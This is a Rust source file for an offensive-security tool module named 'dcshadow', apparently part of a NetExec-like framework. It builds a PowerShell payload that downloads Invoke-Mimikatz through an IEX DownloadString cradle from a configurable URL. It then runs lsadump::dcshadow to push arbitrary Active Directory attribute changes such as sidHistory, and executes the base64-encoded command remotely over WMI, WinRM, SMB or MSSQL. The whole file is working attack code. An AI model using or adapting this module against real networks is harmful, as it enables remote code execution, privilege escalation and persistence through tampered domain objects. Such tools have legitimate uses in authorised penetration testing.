//! # dcshadow — Remote DCShadow (Protocol Smuggling) Module
//!
//! Orchestrates a DCShadow attack using fileless payload injection.
//! It constructs a PowerShell script that invokes Mimikatz (`lsadump::dcshadow`)
//! to temporarily register a rogue Domain Controller and push arbitrary AD attributes.

use anyhow::Result;
use async_trait::async_trait;
use nxc_protocols::{NxcSession, NxcProtocol};

use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};

pub struct DcshadowModule;

impl DcshadowModule {
    pub fn new() -> Self {
        Self
    }
}

impl Default for DcshadowModule {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcModule for DcshadowModule {
    fn name(&self) -> &'static str {
        "dcshadow"
    }

    fn description(&self) -> &'static str {
        "Perform a DCShadow attack to push rogue AD changes (Requires SYSTEM)"
    }

    fn supported_protocols(&self) -> &[&str] {
        &["wmi", "winrm", "smb", "mssql"]
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "TARGET_OBJECT".to_string(),
                description: "The distinguished name or sAMAccountName of the target object".to_string(),
                required: true,
                default: None,
            },
            ModuleOption {
                name: "ATTRIBUTE".to_string(),
                description: "The AD attribute to modify (e.g., primaryGroupId, sidHistory)".to_string(),
                required: true,
                default: None,
            },
            ModuleOption {
                name: "VALUE".to_string(),
                description: "The new value to inject".to_string(),
                required: true,
                default: None,
            },
            ModuleOption {
                name: "MIMIKATZ_URL".to_string(),
                description: "URL to download Invoke-Mimikatz.ps1 (default uses a placeholder)".to_string(),
                required: false,
                default: Some("http://127.0.0.1/Invoke-Mimikatz.ps1".to_string()),
            },
        ]
    }

    async fn run(
        &self,
        session: &mut dyn NxcSession,
        opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let target_object = opts.get("TARGET_OBJECT").ok_or_else(|| anyhow::anyhow!("TARGET_OBJECT option is required"))?;
        let attribute = opts.get("ATTRIBUTE").ok_or_else(|| anyhow::anyhow!("ATTRIBUTE option is required"))?;
        let value = opts.get("VALUE").ok_or_else(|| anyhow::anyhow!("VALUE option is required"))?;
        let mimi_url = opts.get("MIMIKATZ_URL").map(|s| s.as_str()).unwrap_or("http://127.0.0.1/Invoke-Mimikatz.ps1");

        // Construct the PowerShell payload to execute Invoke-Mimikatz
        let script = format!(
            r#"
$ErrorActionPreference = 'Stop';
try {{
    IEX (New-Object Net.WebClient).DownloadString("{}");
    $output = Invoke-Mimikatz -Command "`"lsadump::dcshadow /object:{} /attribute:{} /value:{} /push`"";
    Write-Output "DCShadow Output:";
    Write-Output $output;
}} catch {{
    Write-Output 'DEBUG_ERR: Failed to execute DCShadow payload.';
    Write-Output $_.Exception.Message;
}}
"#,
            mimi_url, target_object, attribute, value
        );

        let b64_script = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            script.encode_utf16().flat_map(|u| u.to_le_bytes()).collect::<Vec<u8>>(),
        );
        let cmd = format!("powershell -e {}", b64_script);

        // Execute via the active protocol
        let output = match session.protocol() {
            "wmi" => {
                let proto = nxc_protocols::wmi::WmiProtocol::new();
                proto.execute(session, &cmd).await?
            }
            "winrm" => {
                let proto = nxc_protocols::winrm::WinrmProtocol::new();
                proto.execute(session, &cmd).await?
            }
            "smb" => {
                let proto = nxc_protocols::smb::SmbProtocol::new();
                proto.execute(session, &cmd).await?
            }
            "mssql" => {
                let proto = nxc_protocols::mssql::MssqlProtocol::new();
                proto.execute(session, &cmd).await?
            }
            _ => return Err(anyhow::anyhow!("Protocol {} does not support execution", session.protocol())),
        };

        let stdout = output.stdout.trim().to_string();
        let success = stdout.contains("ms-DRSR") || stdout.contains("DCShadow") && !stdout.contains("DEBUG_ERR");

        Ok(ModuleResult {
            success,
            output: stdout.clone(),
            data: serde_json::json!({
                "target_object": target_object,
                "attribute": attribute,
                "value": value,
                "success": success,
                "raw_output": stdout
            }),
        })
    }
}
